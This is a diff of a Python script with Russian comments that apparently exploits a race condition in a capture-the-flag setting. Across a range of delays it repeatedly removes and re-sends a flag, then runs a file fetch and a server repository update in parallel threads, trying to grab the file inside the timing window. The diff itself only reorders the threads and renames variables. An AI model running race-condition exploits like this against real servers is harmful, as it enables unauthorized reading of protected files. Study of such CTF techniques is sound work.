@@ -40,30 +40,25 @@ def run_script(path):
     subprocess.run([path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
 
 for delay in [DELAY_START + i*STEP for i in range(int((DELAY_END-DELAY_START)/STEP) + 1)]:
-    print(f"Trying delay: {int(delay*1000)} ms")
+    print(f"Trying delay: {int(delay*1000)} ms", flush=True)
 
     # Убираем флаг
     run_script("./remove_flag.sh")
 
-    # Обновляем репо на сервере
-    trigger_update()
-
     # Добавляем флаг
     run_script("./send_flag.sh")
 
-    # Результат гонки
     result = {'success': False, 'content': ''}
 
-    # Потоки: почти одновременно
-    t1 = threading.Thread(target=fetch_file, args=(result,))
-    t2 = threading.Thread(target=trigger_update)
+    t_fetch = threading.Thread(target=fetch_file, args=(result,))
+    t_update = threading.Thread(target=trigger_update)
 
-    t2.start()
-    time.sleep(delay)  # задержка между ними
-    t1.start()
+    t_fetch.start()
+    time.sleep(delay)
+    t_update.start()
 
-    t1.join()
-    t2.join()
+    t_fetch.join()
+    t_update.join()
 
     if result['success']:
         print(f"SUCCESS with delay {int(delay*1000)} ms")
